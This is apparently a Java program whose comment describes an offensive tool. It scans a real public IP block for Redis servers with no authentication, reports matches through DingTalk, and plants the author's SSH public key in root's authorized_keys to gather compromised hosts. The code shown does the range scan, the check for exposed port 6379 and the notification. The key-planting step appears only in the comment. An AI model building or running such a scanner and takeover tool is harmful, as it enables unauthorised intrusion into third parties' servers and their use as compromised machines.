package com.aoshiguchen.loophole;

import com.aoshiguchen.loophole.core.foundation.Foundation;

/**
 * 扫描指定范围的公网ip，发现有暴露redis默认端口且未设置认证密码的ip，保存入文件当中，并且发送钉钉通知
 * 然后自动执行脚本，一键将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里
 * 保存所有的肉鸡ip，并发送钉钉通知
 * Author: yangwen
 * Date:  2019/5/29
 */
public class Main {

    public static void main(String[] args) {
        Foundation.ipv4().ergodicPublicNetworkIp("110.42.0.39","110.42.255.255", // 设置扫描ip段
                ipv4 ->  Foundation.redis().check(ipv4.getString()), // 过滤暴露6379外网端口的ip
                (ipv4,progress) -> System.out.println(progress + "%")    // 输出扫描进度
                ,ipv4 -> {
                System.out.println(ipv4);   // 输出符合要求的ip
                Foundation.ding().notice(ipv4.getString()); // 发送钉钉通知
        });
    }
}
